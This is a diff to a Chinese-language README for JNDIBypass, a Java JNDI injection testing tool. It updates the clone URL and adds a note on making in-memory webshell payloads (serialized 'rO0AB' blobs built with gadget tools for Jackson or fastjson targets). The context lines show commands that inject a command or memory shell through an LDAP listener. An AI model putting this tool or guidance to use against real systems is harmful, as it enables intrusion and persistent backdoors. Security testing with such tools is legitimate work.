@@ -20,7 +20,7 @@ JNDIBypass 是一个用于测试 Java JNDI 注入漏洞的工具，可用于安�
 
 ```bash
 # 克隆项目
-git clone https://github.com/yourusername/jndibypass.git
+git clone https://github.com/kN6jq/jndibypass.git
 
 # 进入项目目录
 cd jndibypass
@@ -30,6 +30,7 @@ mvn clean package
 ```
 
 ## 使用方法
+
 
 ```bash
 # 基本用法
@@ -41,6 +42,11 @@ java -jar target/jndibypass-1.0-SNAPSHOT.jar -a 192.168.11.1 -p 1389 -c "touch /
 # 示例 - 注入内存马
 java -jar target/jndibypass-1.0-SNAPSHOT.jar -a 192.168.11.1 -p 1389 -ms 1.txt
 ```
+
+## 内存马生成
+
+这里主要是看依赖，一般来说可以考虑jackjson或者fastjson之类的
+使用java-chains等工具生成的rO0AB开头内存马
 
 ## 参数说明
 
